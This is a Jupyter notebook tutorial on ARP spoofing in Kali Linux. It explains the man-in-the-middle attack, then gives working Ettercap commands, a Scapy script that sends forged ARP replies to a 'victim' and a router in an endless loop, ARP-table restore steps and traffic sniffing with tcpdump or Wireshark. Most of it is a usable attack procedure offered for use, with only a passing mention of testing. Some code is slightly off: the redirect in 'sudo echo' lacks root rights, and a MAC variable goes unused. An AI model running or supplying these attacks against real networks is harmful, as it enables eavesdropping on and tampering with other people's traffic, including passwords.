{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "73406df1-56da-4e5e-8033-2d96fd28590f",
   "metadata": {},
   "source": [
    "# Arp Spoofing"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5f448d9b-0919-43ed-927b-a315f9131f9a",
   "metadata": {},
   "source": [
    "## What is ARP spoofing?"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c76b0162-1cdb-4354-8e77-41150d855957",
   "metadata": {},
   "source": [
    "ARP spoofing (or ARP poisoning) is a cyberattack where a hacker tricks a network into sending data to their device instead of the intended recipient. This is done by sending fake ARP (Address Resolution Protocol) messages, associating the hacker's MAC address with the IP of a legitimate device, like a router. As a result, traffic meant for that device is intercepted, allowing the attacker to eavesdrop, modify, or redirect network data."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b000f66f-d0d1-40f2-ba0e-8a0561d29b77",
   "metadata": {},
   "source": [
    "![arp spoofing](./images/arp-spoofing.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f0427ba8-34d9-42c1-9aa6-8346c669812a",
   "metadata": {},
   "source": [
    "The image visually represents an **ARP spoofing attack**, where an attacker manipulates ARP tables to intercept network traffic.\n",
    "\n",
    "### Breakdown of the Attack:\n",
    "1. **Legitimate Network Setup:**\n",
    "   - The **User** (left) has an IP of `186.15.1.10` and a MAC address.\n",
    "   - The **Router** (right) has an IP of `186.15.1.1` and its own MAC address.\n",
    "   - Normally, the user's traffic would go through the switch to the router and then to the internet.\n",
    "\n",
    "2. **The Attacker's Role:**\n",
    "   - The **Attacker** (top center) has an IP of `186.15.1.11` and a different MAC address.\n",
    "   - They send **fake ARP replies** to both the **User** and the **Router**.\n",
    "\n",
    "3. **Fake ARP Replies:**\n",
    "   - The attacker **falsely tells the user** that the router’s IP (`186.15.1.1`) belongs to the attacker’s MAC (`B`).\n",
    "   - The attacker **falsely tells the router** that the user’s IP (`186.15.1.10`) belongs to their MAC (`B`).\n",
    "\n",
    "4. **Impact of the Attack:**\n",
    "   - Now, both the **User** and **Router** unknowingly send data to the **Attacker** instead of each other.\n",
    "   - The attacker **intercepts all traffic**, allowing them to:\n",
    "     - **Monitor** sensitive data (e.g., passwords, emails).\n",
    "     - **Modify** traffic before forwarding it.\n",
    "     - **Drop traffic**, causing a denial of service.\n",
    "\n",
    "### Conclusion:\n",
    "The attacker successfully places themselves in the middle of the communication, performing a **Man-in-the-Middle (MitM) attack** using ARP spoofing."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "af5491c8-27b9-4947-bc34-d0a7a2770d8a",
   "metadata": {},
   "source": [
    "## Step-by-Step Guide to ARP Spoofing in Kali Linux"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c863d3d9-fc74-4f5b-babc-72a0b15815e2",
   "metadata": {},
   "source": [
    "### **1. Enable IP Forwarding**\n",
    "Before launching an ARP spoofing attack, enable IP forwarding so that Kali can forward packets between the victim and the router (otherwise, the connection will break).  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db2f7a90-508a-478c-88aa-a489722eb726",
   "metadata": {},
   "outputs": [],
   "source": [
    "sudo echo 1 > /proc/sys/net/ipv4/ip_forward"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24e5a90c-1d46-41cf-8335-eea6ea8f3e49",
   "metadata": {},
   "source": [
    "or"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "464285f6-573f-4eeb-8f49-81e4739c1c93",
   "metadata": {},
   "outputs": [],
   "source": [
    "sudo sysctl -w net.ipv4.ip_forward=1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "596fa9db-33ec-4095-8ee6-09b9ca39f430",
   "metadata": {},
   "source": [
    "## **Method 1: Using Ettercap (Easier)**"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2beb3f40-651a-46c3-98df-0ccb246eb834",
   "metadata": {},
   "source": [
    "### **2. Start Ettercap GUI or CLI**\n",
    "Ettercap is a powerful tool for ARP poisoning and packet sniffing.\n",
    "\n",
    "- **GUI Mode**:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f74f261e-98eb-4bbb-80af-d19f8ec21f98",
   "metadata": {},
   "outputs": [],
   "source": [
    "ettercap -G"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fe5fcde5-df14-44a2-80e1-6bf9310a65c4",
   "metadata": {},
   "source": [
    "Then navigate to **Sniff → Unified Sniffing**, select your network interface, and go to **Mitm → ARP Poisoning**. Here Target 1 is victim device and Target 2 is gateway (router)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4e13f29-ca0f-44f8-a6ce-2b09c4b8daaa",
   "metadata": {},
   "source": [
    "- **CLI Mode** (for automation):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8f8d8a8-ec3c-4f70-b971-f4a56e59f1ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "ettercap -T -q -M arp -i eth0 -T /192.168.1.1/ /192.168.1.10/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8901c380-d20a-43b7-a675-3d054f09d386",
   "metadata": {},
   "source": [
    "  - `-T` → Text mode (use `-G` for GUI)\n",
    "  - `-q` → Quiet mode\n",
    "  - `-M arp` → Man-in-the-Middle attack using ARP\n",
    "  - `-i eth0` → Specify the network interface\n",
    "  - `192.168.1.1` → Target router\n",
    "  - `192.168.1.10` → Target victim  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f96a470-2edd-4ed9-85a9-4c4d87f15369",
   "metadata": {},
   "source": [
    "## **Method 2: Using Scapy (Python Script)**\n",
    "For more control, you can use `scapy`, a Python library for packet manipulation."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13e4b8b5-ceec-40f1-b8d1-00b8cca1c615",
   "metadata": {},
   "source": [
    "### **2. Install Scapy (if not installed)**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd51eb14-db5e-4d46-a9bc-c4dbc3be4e68",
   "metadata": {},
   "outputs": [],
   "source": [
    "pip install scapy"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "99e8aa08-b592-4fa7-8795-17b27f570122",
   "metadata": {},
   "source": [
    "### **3. ARP Spoofing Script (Python)**\n",
    "Create a script to continuously send fake ARP replies to poison the network."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "b984cf44-7db5-450a-a82b-6ef6f1c2204b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'scapy.layers.l2.ARP'>\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import ARP, send\n",
    "import time\n",
    "\n",
    "print(ARP)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "426c907a-9809-44b6-ae91-21046491a650",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define victim and gateway (router) IP addresses\n",
    "victim_ip = \"192.168.1.10\"\n",
    "gateway_ip = \"192.168.1.1\"\n",
    "attacker_mac = \"AA:BB:CC:DD:EE:FF\"  # Replace with your MAC address\n",
    "\n",
    "def arp_spoof(target_ip, spoof_ip):\n",
    "    \"\"\"Send a fake ARP reply to make the target associate spoof_ip with attacker's MAC.\"\"\"\n",
    "    arp_response = ARP(op=2, pdst=target_ip, hwdst=\"ff:ff:ff:ff:ff:ff\", psrc=spoof_ip)\n",
    "    send(arp_response, verbose=False)\n",
    "\n",
    "print(\"Starting ARP spoofing attack...\")\n",
    "try:\n",
    "    while True:\n",
    "        arp_spoof(victim_ip, gateway_ip)  # Victim thinks attacker is the router\n",
    "        arp_spoof(gateway_ip, victim_ip)  # Router thinks attacker is the victim\n",
    "        time.sleep(2)  # Send ARP reply every 2 seconds\n",
    "except KeyboardInterrupt:\n",
    "    print(\"\\nStopping attack and restoring network...\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45435c82-efc1-4c91-9475-fcf2cde94429",
   "metadata": {},
   "source": [
    "## **4. Restoring the Network (Fix ARP Tables)**\n",
    "To undo the attack and restore correct ARP mappings:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4520d227-079e-4334-ae35-07e9e375cc21",
   "metadata": {},
   "outputs": [],
   "source": [
    "arp -d 192.168.1.1  # Delete incorrect ARP entry for router\n",
    "arp -d 192.168.1.10 # Delete incorrect ARP entry for victim"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9dc05e2-2c0e-4286-9441-59e39e81430a",
   "metadata": {},
   "source": [
    "Alternatively, send real ARP packets using `scapy`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d2d78bc-aa3f-4209-952e-7184ada92a8f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import ARP, send\n",
    "\n",
    "victim_ip = \"192.168.1.10\"\n",
    "gateway_ip = \"192.168.1.1\"\n",
    "victim_mac = \"XX:XX:XX:XX:XX:XX\"  # Replace with real MAC\n",
    "gateway_mac = \"YY:YY:YY:YY:YY:YY\"  # Replace with real MAC\n",
    "\n",
    "# Restore ARP tables\n",
    "send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=3)\n",
    "send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d5312c58-05ca-4d6c-9a00-dfba7703299e",
   "metadata": {},
   "source": [
    "## **5. Sniffing Traffic (Optional)**\n",
    "If you want to capture network traffic during the attack, use:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "abfd29aa-36f9-4c9a-b4f4-0008a93d1662",
   "metadata": {},
   "outputs": [],
   "source": [
    "tcpdump -i eth0 -n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e718e4d4-6bbc-4648-9db1-a77e570a971a",
   "metadata": {},
   "source": [
    "or"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08552fed-2283-4cd1-8264-05483783a5f3",
   "metadata": {},
   "outputs": [],
   "source": [
    "wireshark"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f1c22c1-1de4-4832-801c-b653cfbdb1f8",
   "metadata": {},
   "source": [
    "Then, filter packets by protocol (`http`, `dns`, `ftp`, etc.)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f809e0d7-b67d-4805-a5f5-21adbe726f2a",
   "metadata": {},
   "source": [
    "### **Conclusion**\n",
    "- **Method 1 (Ettercap)** is easier for quick demonstrations.  \n",
    "- **Method 2 (Scapy)** gives more control and scripting ability.  \n",
    "- Always **restore ARP tables** after testing.  \n",
    "- Use **Wireshark or tcpdump** to observe intercepted packets.  "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
